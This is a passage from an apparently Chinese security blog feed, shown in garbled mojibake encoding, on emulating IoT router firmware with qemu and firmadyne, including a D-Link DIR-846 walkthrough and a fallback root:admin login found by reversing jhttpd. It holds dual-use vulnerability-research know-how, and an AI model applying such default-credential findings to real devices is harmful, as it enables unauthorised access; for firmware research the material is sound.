<p>ç¬¬äºŒä¸ªæ¯”è¾ƒå–å·§ï¼Œæ—¢ç„¶æ‰¾ä¸åˆ° &#x2F;proc ä¸‹çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆä¸èƒ½ç›´æ¥åˆ›å»ºæ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•å°†è®¿é—® &#x2F;proc&#x2F;nvram ä¿®æ”¹æˆè®¿é—® &#x2F;test&#x2F;nvramã€‚</p>
<p>ç”¨ IDA patch libnvram.soï¼ˆåŸç‰ˆçš„ï¼‰ï¼Œå†ç”¨ firmadyne æ¨¡æ‹Ÿã€‚</p>
<p>å¾ˆé—æ†¾ï¼Œè¿™æ ·æ“ä½œè¿˜æ˜¯å­˜åœ¨é—®é¢˜ã€‚æŸ¥çœ‹æ—¥å¿—æç¤ºæ— æ³•è®¿é—® &#x2F;proc&#x2F;mtdã€‚æˆ‘ç®€å•çœ‹äº†ä¸€ä¸‹ï¼Œè¿™ä¸ªå›ºä»¶è¦è®¿é—®çš„ &#x2F;proc æ–‡ä»¶å¾ˆå¤šï¼Œä¸€ä¸ªä¸ªå»æ‰‹åŠ¨ patch å¾ˆéº»çƒ¦ï¼Œè€Œä¸”å°±ç®— patch æˆåŠŸï¼Œä¹Ÿæœ‰å¾ˆå¤šé…ç½®çš„ç¼ºå¤±ï¼Œæ­£å¸¸æ¨¡æ‹Ÿçš„æ¦‚ç‡å¾ˆä½ã€‚(æˆ‘æŒ‰ç…§æŠ¥é”™ä¿¡æ¯ patch äº† mtdï¼Œä½†æ˜¯å’Œ nvram ä¸åŒï¼Œä¾æ—§æŠ¥é”™ï¼ŒçŒœæµ‹æ˜¯é…ç½®ä¸¢å¤±æˆ–é”™è¯¯å¯¼è‡´çš„)</p>
<p>é€šè¿‡æŸ¥çœ‹ç”¨æˆ·æ‰‹å†Œï¼Œå‘ç°è¿™æ¬¾è®¾å¤‡å­˜åœ¨ web ç®¡ç†ç•Œé¢ï¼Œæ—¢ç„¶èƒ½é€šè¿‡ web è®¿é—®ï¼Œè‚¯å®šæœ‰å’Œ http ç›¸å…³çš„ç¨‹åºï¼Œåœ¨ç›®å½•ä¸­æœç´¢ httpï¼Œå‘ç°ä¸€ä¸ªåä¸º jhttpd çš„ç¨‹åºï¼Œåº”è¯¥æ˜¯è‡ªå·±å®ç°çš„ web æœåŠ¡å™¨ã€‚</p>
<p>å¦å¤–æ²¡æœ‰å‘ç°ç±»ä¼¼ htmlã€js ç­‰é™æ€æ–‡ä»¶ï¼ŒçŒœæµ‹æ‰€æœ‰ web å¤„ç†é€»è¾‘å…¨éƒ½é›†ä¸­åœ¨ jhttpd ä¸­ã€‚</p>
<p>é‚£ä¹ˆå•ç‹¬æ¨¡æ‹Ÿ jhttpd è¿™ä¸ªç¨‹åºï¼Œæ˜¯å¦å°±èƒ½çœ‹åˆ° web ç®¡ç†ç•Œé¢å‘¢ï¼Ÿ</p>
<p>æ¨¡æ‹Ÿå•ä¸ªç¨‹åºéå¸¸ç®€å•ï¼Œä½¿ç”¨å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mips -L . ./usr/sbin/jhttpd</span><br></pre></td></tr></table></figure></div>

<p>æ‰§è¡Œèµ·æ¥æç¤ºæ‰¾ä¸åˆ° nvramï¼ŒæŒ‰ç…§ä¸Šé¢çš„æ“ä½œè‡ªå·±å»ºç«‹ä¸€ä¸ªï¼Œå†æ¬¡æ‰§è¡Œï¼Œæ²¡å‡ºç°ä»»ä½•æŠ¥é”™ä¿¡æ¯ã€‚å°è¯•ç”¨æµè§ˆå™¨è®¿é—®ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmware1.png"
                     
                ></p>
<p>è¿™æ ·å¯ä»¥æˆåŠŸæ¨¡æ‹Ÿè®¾å¤‡çš„ web æœåŠ¡ã€‚</p>
<p>æŒ‰ç…§ç”¨æˆ·æ‰‹å†Œæç¤ºçš„è´¦æˆ·(admin:admin)ç™»å½•ï¼Œæç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ã€‚</p>
<p>æˆ‘é€†å‘åˆ†æäº†ä¸€ä¸‹ jhttpd ç¨‹åºï¼Œå‘ç°ä»–ä¼šå°è¯•å» nvram è¯»å–é…ç½®ï¼Œå…¶ä¸­åŒ…å«è´¦å·å’Œå¯†ç ï¼Œnvram ä¸­é»˜è®¤çš„æ˜¯ admin:adminï¼Œä½†æ˜¯æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ nvram å¹¶ä¸åŒ…å«è¿™äº›é…ç½®ï¼Œæ‰€ä»¥æ— æ³•æ­£å¸¸ç™»å½•ã€‚</p>
<p>å½“ jhttpd æ£€æµ‹åˆ°æ— æ³•è¯»å–ç”¨æˆ·åå’Œå¯†ç æ—¶ï¼Œä¼šè®¾ç½®é»˜è®¤çš„ç”¨æˆ·åä¸º rootï¼Œå¯†ç ä¸º adminï¼Œå°è¯•ç™»é™†æˆåŠŸã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmware2.png"
                     
                ></p>
<p>ä¸è¿‡ï¼Œè¿™ç§æ¨¡æ‹Ÿæ–¹å¼è¿˜å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œæˆ‘ä»¬ç°åœ¨åªèƒ½çœ‹åˆ° web ç•Œé¢ï¼Œå¹¶ä½¿ç”¨å¾ˆå°‘çš„ä¸€éƒ¨åˆ†åŠŸèƒ½ï¼Œå¤§éƒ¨åˆ†åŠŸèƒ½åœ¨å‘é€è¯·æ±‚ä¹‹åä¼šå¯¼è‡´ jhttpd å´©æºƒï¼Œç»è¿‡ä¸€ç•ªæ’æŸ¥å‘ç°å¤§éƒ¨åˆ†é”™è¯¯å‘ç”Ÿåœ¨è°ƒç”¨æŸ libc å‡½æ•°æ—¶ï¼Œä¾‹å¦‚ ping åŠŸèƒ½ä¼šè°ƒç”¨ fork å‡½æ•°æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡ qemu å•ç‹¬æ¨¡æ‹Ÿçš„ç¯å¢ƒæ‰§è¡Œ fork å°†å¤±è´¥ã€‚é…ç½® wifi çš„è¯·æ±‚ä¼šè°ƒç”¨æŸè„šæœ¬ï¼Œè€Œæ¨¡æ‹Ÿç¯å¢ƒä¸‹è„šæœ¬ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œè¿›è€Œæ•´ä¸ªè¿›ç¨‹ä¼šå´©æºƒã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>å›ºä»¶æ¨¡æ‹Ÿ Case Study (1)</title>
    <url>/2020/01/08/firmadyne1/</url>
    <content><![CDATA[<p>å½“åˆ†æç‰©è”ç½‘è®¾å¤‡å›ºä»¶æ—¶ï¼Œä¸ºäº†éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œå¯èƒ½éœ€è¦å¯¹å›ºä»¶è¿›è¡Œæ¨¡æ‹Ÿï¼Œç›®å‰å¯¹äºå›ºä»¶æ¨¡æ‹Ÿæ¯”è¾ƒå¥½çš„å¼€æºè§£å†³æ–¹æ¡ˆæ˜¯ firmadyneï¼Œä½†åœ¨å®é™…ä½¿ç”¨ firmadyne çš„è¿‡ç¨‹ä¸­ä¼šé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼Œè¿™ç¯‡æ–‡ç« ç®€å•æ€»ç»“ä¸€ä¸‹ä½¿ç”¨ firmadyne å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ï¼Œä»¥åŠéƒ¨åˆ†è§£å†³æ–¹æ¡ˆã€‚</p>
<span id="more"></span>

<h2 id="å…³äº-firmadyne-çš„åŸç†"><a href="#å…³äº-firmadyne-çš„åŸç†" class="headerlink" title="å…³äº firmadyne çš„åŸç†"></a>å…³äº firmadyne çš„åŸç†</h2><p>firmadyne æœ‰ä¸€ç¯‡<a class="link"   href="https://github.com/firmadyne/firmadyne/blob/master/paper/paper.pdf" >ç›¸å…³è®ºæ–‡<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œä¸»è¦ä½œè€…æ¥è‡ª CMUï¼Œè¿™ç¯‡è®ºæ–‡è¯¦ç»†ä»‹ç»äº† firmadyne çš„å®ç°æ€è·¯å’Œéƒ¨åˆ†åŸç†ï¼Œæ¨èè¯¦ç»†é˜…è¯»ä¸€ä¸‹ï¼Œæˆ‘åœ¨è¿™é‡Œåªåšç®€å•ä»‹ç»ã€‚</p>
<p>æ•´ä¸ªæ¡†æ¶æœ‰ 4 éƒ¨åˆ†ç»„ä»¶ï¼š</p>
<ol>
<li>çˆ¬è™«ç»„ä»¶ï¼šä»å„å¤§å‚å•†ç‰¹å®šçš„å›ºä»¶æœåŠ¡å™¨ä¸Šé¢çˆ¬å–ä¸åŒè®¾å¤‡ã€ä¸åŒç‰ˆæœ¬çš„å›ºä»¶ï¼Œå¹¶ä¸‹è½½åˆ°æœ¬åœ°å­˜å‚¨ã€‚</li>
<li>è§£å‹ç»„ä»¶ï¼šé€šå¸¸å›ºä»¶ä¼šç»è¿‡æŸç§æ‰‹æ®µå‹ç¼©ä¸ºé•œåƒæ ¼å¼æ–‡ä»¶ï¼Œæ­¤ç»„ä»¶ä¸»è¦ç”¨äºå°†é•œåƒè¿˜åŸä¸ºæ ‡å‡†çš„æ–‡ä»¶ç³»ç»Ÿã€‚</li>
<li>æ¨¡æ‹Ÿç»„ä»¶ï¼šåˆ©ç”¨ qemu æ¨¡æ‹ŸæˆåŠŸè¿˜åŸçš„å›ºä»¶ï¼Œæ„é€ åˆé€‚çš„è™šæ‹Ÿç¡¬ä»¶ç¯å¢ƒä»¥æ”¯æŒå›ºä»¶è¿è¡Œã€‚</li>
<li>åŠ¨æ€åˆ†æç»„ä»¶ï¼šåˆ©ç”¨å·²çŸ¥çš„ poc æˆ– fuzz ç­‰æŠ€æœ¯å¯¹æˆåŠŸæ¨¡æ‹Ÿçš„å›ºä»¶è¿›è¡Œå®‰å…¨æµ‹è¯•ï¼Œå°†å‘ç°çš„æ¼æ´ç­‰å­˜æ¡£ã€‚</li>
</ol>
<p>æˆ‘ä»¬åœ¨å®é™…åˆ†æè¿‡ç¨‹ä¸­å¸¸ç”¨çš„æ˜¯ç¬¬äºŒå’Œç¬¬ä¸‰ä¸ªç»„ä»¶ã€‚</p>
<p>è§£å‹ç»„ä»¶ä¸»è¦ç”¨åˆ°çš„è¿˜æ˜¯ binwalk çš„ apiï¼Œä½†æ˜¯ä½œè€…äººä¸ºçš„å¯¹è§£å‹ç­–ç•¥è¿›è¡Œäº†é™åˆ¶å’Œä¼˜åŒ–ã€‚</p>
<p>åœ¨æœ€ä¸»è¦çš„æ¨¡æ‹Ÿç»„ä»¶ä¸­ï¼Œä½œè€…æåˆ°äº†ä¸€ä¸ªå…³é”®é—®é¢˜ï¼šå¯¹ NVRAM çš„æ”¯æŒã€‚å¤§éƒ¨åˆ†è·¯ç”±å™¨ã€äº¤æ¢æœºç­‰ç±»ä¼¼è®¾å¤‡ç¡¬ä»¶ä¸Šéƒ½æœ‰ä¸€ç‰‡ç§°ä¸º nvram çš„å­˜å‚¨èŠ¯ç‰‡ï¼Œå…¶å†…éƒ¨ä¿å­˜äº†ä¸€äº›é‡è¦é…ç½®ä¿¡æ¯ï¼Œå½“è®¾å¤‡å¯åŠ¨çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šå°è¯•ä» nvram ä¸­è¯»å–è¿™äº›ä¿¡æ¯ã€‚</p>
<p>ç„¶è€Œ QEMU æ‰€æä¾›çš„è™šæ‹ŸåŒ–ç¯å¢ƒé»˜è®¤å¹¶ä¸åŒ…æ‹¬è¿™ä¸€ç¡¬ä»¶è®¾å¤‡ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ qemu + chroot ç­‰æ‰‹æ®µå¯åŠ¨å›ºä»¶çš„æ—¶å€™ç»å¸¸ä¼šçœ‹åˆ°æœ‰å…³äº nvram ç¼ºå¤±çš„æç¤ºä¿¡æ¯ã€‚</p>
<p>firmadyne è‡ªå·±å®ç°äº†ä¸€ä¸ª libnvram.so åº“æ–‡ä»¶ï¼Œé‡Œé¢æ¨¡æ‹Ÿäº†å¾ˆå¤šå’Œè®¿é—® nvram æœ‰å…³çš„ APIï¼Œé€šè¿‡ä»£ç ç›´æ¥é™åˆ¶ç¨‹åºè¯»å– nvram çš„è¡Œä¸ºï¼Œè¿™æ ·ä¸€æ¥å°±å¯ä»¥è¾¾åˆ°â€œæ¬ºéª—â€œå›ºä»¶çš„ç›®çš„ã€‚</p>
<p>å¦å¤–ä¸€ä¸ªå…³é”®é—®é¢˜æ˜¯ç½‘ç»œçš„é…ç½®ï¼ŒæˆåŠŸç”Ÿæˆä¸€ä¸ªå›ºä»¶é•œåƒä¹‹åï¼Œfirmadyne ä¼šå¯åŠ¨è¿™ä¸ªé•œåƒï¼ŒæŒç»­çº¦ 60 ç§’ï¼Œä½œè€…ç§°ä¹‹ä¸ºâ€å­¦ä¹ é˜¶æ®µâ€œï¼Œåœ¨æ­¤é˜¶æ®µï¼Œæ¡†æ¶ä¼šåˆ†æé•œåƒå¯åŠ¨è¿‡ç¨‹ä¸­ç•™ä¸‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œåœ¨é‡Œé¢è·å–å’Œç½‘å¡ã€vlanã€ç½‘è·¯é…ç½®æœ‰å…³çš„ä¿¡æ¯ï¼Œä¹‹ååˆ©ç”¨ qemu çš„ TAP æ¨¡å¼ï¼Œåœ¨å®¿ä¸»æœºåˆ›å»ºè™šæ‹Ÿç½‘å¡ï¼Œç„¶åæŒ‡å®šç»™ qemu ç”¨äºä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ã€‚</p>
<p>ä¸è¿‡è¿™ä¸ªæ¨¡æ‹Ÿç½‘ç»œçš„ç­–ç•¥å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæˆ‘ä»¬åæ–‡å†è¯´ã€‚</p>
<h2 id="firmadyne-çš„å®‰è£…"><a href="#firmadyne-çš„å®‰è£…" class="headerlink" title="firmadyne çš„å®‰è£…"></a>firmadyne çš„å®‰è£…</h2><p>firmadyne é¡¹ç›®å†å²æ¯”è¾ƒæ‚ ä¹…äº†ï¼Œåœ¨ github ä¸Šé¢çœ‹åˆ°æŸäº›æ–‡ä»¶çš„ commit åœ¨ 4 å¹´å‰ï¼ŒåŠ ä¸Šä½œè€…åœ¨ issue ä¸­æåˆ°è‡ªå·±çš„æ—¶é—´æ¯”è¾ƒå°‘ï¼Œæœªæ¥ä¸ä¼šæŠ•å…¥å¤§é‡ç²¾åŠ›ç»´æŠ¤è¿™ä¸ªé¡¹ç›®ï¼Œå¯¼è‡´ç›®å‰ firmadyne å’Œå…¶ä¾èµ–è½¯ä»¶(æ¯”å¦‚ qemuã€binwalk ç­‰)ä¹‹é—´å­˜åœ¨å„ç§å…¼å®¹æ€§é—®é¢˜ï¼Œåœ¨å®‰è£…çš„æ—¶å€™è¦æ ¼å¤–æ³¨æ„ã€‚</p>
<p>å®‰è£…çš„å…·ä½“æ•™ç¨‹åœ¨ç™¾åº¦å’Œ github éƒ½æœ‰è¯¦ç»†çš„ä»‹ç»ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œåªæä¸€ä¸‹éœ€è¦æ³¨æ„çš„è¦ç‚¹ã€‚</p>
<ol>
<li>å…³äºå®‰è£…ç³»ç»Ÿï¼šæ¨è Ubuntu 14.04ï¼Œè¿™ä¹Ÿæ˜¯ä½œè€…æ¨èçš„ç‰ˆæœ¬ï¼Œè€ƒè™‘åˆ°æ­¤é¡¹ç›®æ—¶é—´ä¹…è¿œï¼Œåœ¨æ–°çš„ç³»ç»Ÿä¸Šé¢å¯èƒ½ä¼šå‡ºç°å„ç§å…¼å®¹é—®é¢˜ã€‚</li>
<li>å…³äº QEMUï¼šæœ€å¥½ä¸è¦ä»æºä»£ç ç¼–è¯‘ï¼Œå¦å¤–ä¸è¦ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ï¼Œç”¨ apt å®‰è£…å³å¯ï¼ŒåŸå› æ˜¯ firmadyne ä¸­åœ¨å¯åŠ¨é•œåƒé˜¶æ®µä¼šç”¨åˆ°æŸäº›å’Œ vlan æœ‰å…³çš„å¯åŠ¨å‚æ•°ï¼Œè¿™äº›å‚æ•°åœ¨ QEMU 3.0 ç‰ˆæœ¬ä¸­å·²ç»ç§»é™¤ï¼Œå¹¶ä¸”æ–°ç‰ˆå­˜åœ¨å¾ˆå¤š API ä¸Šçš„å˜åŒ–ï¼Œå¾ˆå¯èƒ½å‡ºç°æ¨¡æ‹Ÿä¸æˆåŠŸã€å‚æ•°é”™è¯¯ç­‰æ£˜æ‰‹çš„é—®é¢˜ã€‚</li>
<li>å…³äº binwalkï¼šæŒ‰ç…§æç¤ºå®‰è£…å¥½ä¹‹åï¼Œæœ€å¥½æ‰¾ä¸€ä¸ªå›ºä»¶æµ‹è¯•ä¸€ä¸‹(github ç»™å‡ºçš„æµ‹è¯•å›ºä»¶å³å¯)ï¼Œå› ä¸º binwalk åœ¨è§£å‹å›ºä»¶çš„æ—¶å€™ä¼šä¾èµ–æŸäº›æ’ä»¶(æ¯”å¦‚ python-LZMA)ï¼Œå½“æ’ä»¶ç¼ºå¤±çš„æ—¶å€™è§£å‹å°†å¤±è´¥ã€‚</li>
<li>å…³äºæ•°æ®åº“ï¼šä¸¥æ ¼æŒ‰ç…§æç¤ºçš„é…ç½®æ­¥éª¤æ¥ï¼Œç‰¹åˆ«æ³¨æ„å¯†ç æ˜¯å¦æ­£ç¡®(firmadyne)ã€‚</li>
<li>åˆ«å¿˜äº†å®‰è£…å®Œæˆè¿˜éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ config æ–‡ä»¶å¤´éƒ¨çš„è·¯å¾„ã€‚</li>
<li><strong>ä½¿ç”¨ git clone ç›´æ¥å…‹éš†ä»“åº“ä»£ç ï¼Œä¸è¦ä½¿ç”¨æ—§ç‰ˆæœ¬çš„ä»£ç ã€‚</strong></li>
</ol>
<p>å¦å¤–æœ‰ä¸€ä¸ªåä¸º FAT çš„é¡¹ç›®å¯ç”¨äºç®€åŒ– firmadyne æ“ä½œã€‚</p>
<h2 id="å¯èƒ½é‡åˆ°çš„é—®é¢˜ä»¥åŠä¸€äº›æ³¨æ„äº‹é¡¹"><a href="#å¯èƒ½é‡åˆ°çš„é—®é¢˜ä»¥åŠä¸€äº›æ³¨æ„äº‹é¡¹" class="headerlink" title="å¯èƒ½é‡åˆ°çš„é—®é¢˜ä»¥åŠä¸€äº›æ³¨æ„äº‹é¡¹"></a>å¯èƒ½é‡åˆ°çš„é—®é¢˜ä»¥åŠä¸€äº›æ³¨æ„äº‹é¡¹</h2><p>é…ç½®æ–‡ä»¶é—®é¢˜ï¼Œfirmadyne å®‰è£…å®Œæˆï¼Œåˆæ¬¡ä½¿ç”¨çš„æ—¶å€™éœ€è¦ä¿®æ”¹ config é…ç½®ï¼Œå¿˜è®°ä¿®æ”¹ä¼šå‡ºç°å˜é‡æœªå®šä¹‰çš„é”™è¯¯ã€‚</p>
<p>å¯†ç é—®é¢˜ï¼Œæ•°æ®åº“é»˜è®¤å¯†ç ä¸º firmadyneï¼Œå¦‚æœé…ç½®çš„æ—¶å€™ä¸å°å¿ƒè¾“å…¥é”™è¯¯ä¼šå¯¼è‡´åç»­æ“ä½œå‡ºç°å¼‚å¸¸ã€‚</p>
<p>ä¾èµ–ç»„ä»¶ç‰ˆæœ¬é—®é¢˜ï¼Œå‰é¢æåˆ° firmadyne å¯¹å„ä¾èµ–å·¥å…·å­˜åœ¨ç‰ˆæœ¬é™åˆ¶ï¼Œåœ¨å®‰è£…è¿‡ç¨‹ä¸­å°½é‡æŒ‰ç…§ GitHub æç¤ºè¿›è¡Œï¼Œä¸è¦è‡ªå·±é€‰æ‹©ç‰ˆæœ¬ã€‚</p>
<p>ç½‘ç»œé—®é¢˜ï¼Œåœ¨é…ç½®ç½‘ç»œè¿™ä¸€æ­¥ä¼šå‡ºç°å¾ˆå¤šå¼‚å¸¸æƒ…å†µï¼Œé¦–å…ˆè¦æ’æŸ¥è¿™ç§å¼‚å¸¸æ˜¯ä¸æ˜¯ç”±å…¶ä»–è½¯ä»¶é€ æˆçš„ï¼Œæ¨èå°† firmadyne å®‰è£…åœ¨æ–°çš„è™šæ‹Ÿæœºç³»ç»Ÿä¸Šé¢ï¼Œé˜²æ­¢è½¯ä»¶ä¹‹é—´äº§ç”Ÿå†²çªã€‚æ£€æŸ¥å½“å‰ç‰ˆæœ¬æ˜¯å¦æœ€æ–°ï¼Œè™½ç„¶ä½œè€…ä¸æ„¿æ„å¯¹æ¡†æ¶è¿›è¡Œå¤§å¹…åº¦çš„æ”¹è¿›ï¼Œä½†æ˜¯å¯¹äºæŸäº›å°é—®é¢˜è¿˜æ˜¯åšå‡ºäº†ä¿®è¡¥ã€‚</p>
<p>å¦‚æœé‡æ–°å®‰è£…æ¡†æ¶é—®é¢˜è¿˜æ˜¯å¾—ä¸åˆ°è§£å†³ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½æ˜¯è¯¥å›ºä»¶å†…éƒ¨å­˜åœ¨æŸäº›ç‰¹æ®Šæ“ä½œï¼Œfirmadyne æ¯•ç«Ÿæ˜¯ä¸€æ¬¾é€šç”¨æ¡†æ¶ï¼Œå¯¹äºä¸€å°éƒ¨åˆ†â€ä¸èµ°å¯»å¸¸è·¯â€œçš„å›ºä»¶å¯èƒ½éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ†æå¼‚å¸¸ï¼Œè¿›è¡Œä¿®æ”¹ã€‚</p>
<p>é™¤ä¸Šé¢æåˆ°çš„ï¼Œåœ¨ GitHub çš„ issue åŒ…æ‹¬äº†å¾ˆå¤šå¤§ç¥çš„è®¨è®ºï¼Œä¸€èˆ¬æ¥è¯´æˆ‘ä»¬é‡åˆ°çš„é—®é¢˜éƒ½å¯ä»¥åœ¨ issue ä¸Šé¢æ‰¾åˆ°ç­”æ¡ˆã€‚</p>
<h2 id="AttifyOS"><a href="#AttifyOS" class="headerlink" title="AttifyOS"></a>AttifyOS</h2><p>github ä¸Šèƒ½æ‰¾åˆ°è¿™ä¸ªè™šæ‹Ÿæœºçš„ä¸‹è½½åœ°å€ <a class="link"   href="https://github.com/adi0x90/attifyos" >https://github.com/adi0x90/attifyos<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>è¯´ç™½äº†ï¼Œå®ƒå°±æ˜¯åŒ…å«äº†ä¸€äº›åˆ†æå·¥å…·çš„è™šæ‹Ÿæœºï¼Œå¤§ç¥å·²ç»å®‰è£…æµ‹è¯•å®Œæ¯•ï¼Œæˆ‘ä»¬ä¸‹è½½å³å¯ä½¿ç”¨ã€‚attifyos å†…ç½®äº† firmadyneï¼Œå¹¶ä¸”å·²ç»é…ç½®äº† FATï¼Œæœ€ç®€å•çš„ä½¿ç”¨æ–¹å¼ï¼šæŠŠé•œåƒæ‹·è´åˆ°è™šæ‹Ÿæœºï¼Œç„¶å python FAT.py &lt;é•œåƒåå­—&gt; å³å¯ã€‚</p>
<p>å¦‚æœä½ ä¸æƒ³æ‰‹åŠ¨å®‰è£…å·¥å…·çš„è¯ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½ attifyosã€‚ä½†è™šæ‹Ÿæœºé‡Œé¢çš„å·¥å…·ç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œæ¨¡æ‹Ÿæ—¶ä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ï¼Œæˆ‘ä¸ªäººæ¨èå…ˆæŠŠ firmadyne <strong>æ›´æ–°åˆ°æ–°ç‰ˆ</strong>ã€‚</p>
<h2 id="å›ºä»¶æ¨¡æ‹Ÿå®ä¾‹"><a href="#å›ºä»¶æ¨¡æ‹Ÿå®ä¾‹" class="headerlink" title="å›ºä»¶æ¨¡æ‹Ÿå®ä¾‹"></a>å›ºä»¶æ¨¡æ‹Ÿå®ä¾‹</h2><p>è¿™é‡Œæˆ‘è®°å½•ä¸€ä¸‹æœ€è¿‘åˆ†æçš„ä¸€æ¬¾è·¯ç”±å™¨å›ºä»¶ DIR-846 çš„æ¨¡æ‹Ÿè¿‡ç¨‹ã€‚</p>
<p>å›ºä»¶å¯ä»¥åœ¨ dlink å®˜ç½‘ä¸‹è½½åˆ°ï¼Œå…ˆç”¨ binwalk çœ‹ä¸€ä¸‹å›ºä»¶çš„å†…å®¹:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/firmadyne-1.png"
                     
                ></p>
<p>å¾ˆæ ‡å‡†çš„æ ¼å¼ï¼Œç›´æ¥ç”¨ binwalk -Me å³å¯è§£å‹å‡ºæ¥ã€‚</p>
<p>é‚£ä¹ˆå¯ä»¥ç›´æ¥ä¸¢è¿› firmadyne å°è¯•æ¨¡æ‹Ÿï¼Œå¦‚æœä½ æ˜¯æ–°å®‰è£…çš„ç³»ç»Ÿå’Œå·¥å…·ï¼Œå…ˆæ‹æ‘„ä¸€ä¸ªå¿«ç…§ï¼Œå‘½åä¸ºåŸå§‹å¿«ç…§ã€‚</p>
<p>é•œåƒä¸¢åˆ° firmadyne ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå‘½ä»¤è§£å‹å›ºä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./sources/extractor/extractor.py -b Dlink -sql 127.0.0.1 -np -nk &quot;DIR846A1_FW100A35.bin&quot; images</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶ä½ å¯ä»¥åœ¨ image ç›®å½•ä¸‹æ‰¾åˆ°åˆšåˆšç”Ÿæˆçš„ 1.tar.gzï¼Œè¯·ä¿®æ”¹å‹ç¼©åŒ…å†…çš„ &#x2F;etc&#x2F;shadow æ–‡ä»¶ï¼Œæ›¿æ¢ root å¯†ç ä¸ºä½ çŸ¥é“çš„å¯†ç (ä¾‹å¦‚ä»è‡ªå·±çš„æœºå™¨ä¸Šæ‹·è´ä¸€ä»½)ã€‚</p>
<p>æ‰§è¡Œå‘½ä»¤è¯†åˆ«å›ºä»¶æ¶æ„</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/getArch.sh ./images/1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>ç„¶ååˆ›å»ºæ•°æ®åº“</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/tar2db.py -i 1 -f ./images/1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>åˆ¶ä½œé•œåƒ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./scripts/makeImage.sh 1</span><br></pre></td></tr></table></figure></div>

<p>é…ç½®ç½‘ç»œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/inferNetwork.sh 1</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶æˆ‘é‡åˆ°äº†é—®é¢˜ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: Unmatched interface: ([&#x27;br-lan&#x27;,192.168.0.1,null,null])</span><br></pre></td></tr></table></figure></div>

<p>ç»§ç»­å‘ä¸‹æ‰§è¡Œ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scratch/1/run.sh</span><br></pre></td></tr></table></figure></div>

<p>ç³»ç»Ÿèƒ½æ­£å¸¸è·‘èµ·æ¥ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°æ²¡åŠæ³•è®¿é—®åˆ°è™šæ‹Ÿæœºå†…çš„è·¯ç”±å™¨ç®¡ç†é¡µé¢ã€‚</p>
<p>æˆ‘åœ¨ç½‘ä¸Šæ‰¾äº†å¾ˆå¤šæ–‡ç« ï¼Œä½†æ˜¯éƒ½æ²¡è§£å†³é—®é¢˜ï¼Œèµ·åˆæ€€ç–‘æ˜¯ firmadyne å®‰è£…æœ‰é—®é¢˜ï¼Œä½¿ç”¨å®˜æ–¹æä¾›çš„ä¾‹å­å›ºä»¶å†æ¬¡æµ‹è¯•å‘ç°å¹¶ä¸æŠ¥é”™ï¼Œè¿›å…¥ç³»ç»Ÿä¹‹ååˆ©ç”¨ ifconfig æŸ¥çœ‹ç½‘å¡ç»“æ„å‘ç° DIR-846 å›ºä»¶åªå¼€å¯äº† br-lan ç½‘å¡æ¥å£ã€‚</p>
